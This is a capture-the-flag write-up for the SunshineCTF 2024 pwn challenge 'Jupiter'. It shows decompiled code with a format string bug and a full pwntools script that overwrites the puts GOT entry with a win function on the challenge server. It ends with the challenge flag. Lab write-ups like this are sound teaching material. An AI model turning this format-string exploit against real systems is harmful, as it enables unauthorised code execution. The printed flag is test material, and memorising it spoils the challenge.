---
title: "Jupiter - SunshineCTF 2024"
category: "pwn"
subcategory: "rop"
type: "writeup"
tags: ["pwn", "got-overwrite", "formatstring", "format-string", "aslr", "pwntools", "gef", "rop", "sunshinectf", "sunshinectf-2024", "2024", "ctf-writeup"]
summary: "The binary has no ASLR, no RELRO and there's a win function."
source:
  name: "CTFtime writeup #39577"
  url: "https://ctftime.org/writeup/39577"
original_source: "https://github.com/ksaweryr/ctf-writeups/blob/master/2024/sunshinectf/Jupiter/README.md"
ctf:
  name: "SunshineCTF 2024"
  year: 2024
  challenge: "Jupiter"
---

## Metadata

- **CTF:** SunshineCTF 2024
- **Task:** Jupiter
- **Author team:** TU Delft CTF Team
- **CTFtime tags:** got-overwrite, formatstring
- **CTFtime:** <https://ctftime.org/writeup/39577>
- **Original writeup:** <https://github.com/ksaweryr/ctf-writeups/blob/master/2024/sunshinectf/Jupiter/README.md>

---
# Jupiter  
> ### Category: I-95  
>  
> Do boys or girls go here?  
>  
> `nc 2024.sunshinectf.games 24609`  
>  
> ### Attachments  
> `jupiter`

## Solution  
The binary has no ASLR, no RELRO and there's a `win` function. Looking at `func0` (called from `main`) it's easy to notice a format string vulnerability:  
```c  
void func0(void) {  
long in_FS_OFFSET;  
char local_78 [104];  
long local_10;  
  
local_10 = *(long *)(in_FS_OFFSET + 0x28);  
printf("What\'s Jupiter\'s best beach?? ");  
fgets(local_78,99,stdin);  
printf(local_78);  
if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  
/* WARNING: Subroutine does not return */  
__stack_chk_fail();  
}  
return;  
}  
```

Simply use it to overwrite the address of `puts` in GOT with the address of `win` (`puts` is called in `main` once more after `func0`). Don't bother writing the payload yourself, use [`fmtstr_payload`](<https://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload>) from `pwntools`.

## Script  
```py  
from gdb_plus import *

FILENAME = './jupiter'  
PORT = 24609

e = ELF(FILENAME)  
dbg = Debugger(FILENAME, script='init-gef').remote('2024.sunshinectf.games', PORT)  
io = dbg.p  
dbg.c(wait=False)

io.sendlineafter(b'FL? ', b'0xdeadc0de') # some random check

writes = {  
e.got['puts']: e.sym['win']  
}

payload = fmtstr_payload(6, writes) # the string is on top of the stack, so it's the 6th argument  
io.sendlineafter(b'?? ', payload)  
io.interactive() # :)  
```

## Flag  
`sun{What is this the dragon with a sword is showing us...? Wait isn't this like a previous chall?}`
